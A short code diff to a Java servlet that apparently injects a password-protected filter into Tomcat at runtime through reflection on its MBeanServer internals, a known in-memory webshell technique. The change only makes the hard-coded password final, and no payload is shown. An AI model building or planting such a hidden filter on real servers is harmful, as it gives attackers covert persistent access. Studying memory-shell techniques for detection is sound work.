@@ -37,7 +37,7 @@ public class FilterBasedWithoutRequest extends HttpServlet {
         try{
             String filterName = "dynamic1";
             String urlPattern = "/abc";
-            String password = "pass";
+            final String password = "pass";
 
             MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer();
             Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
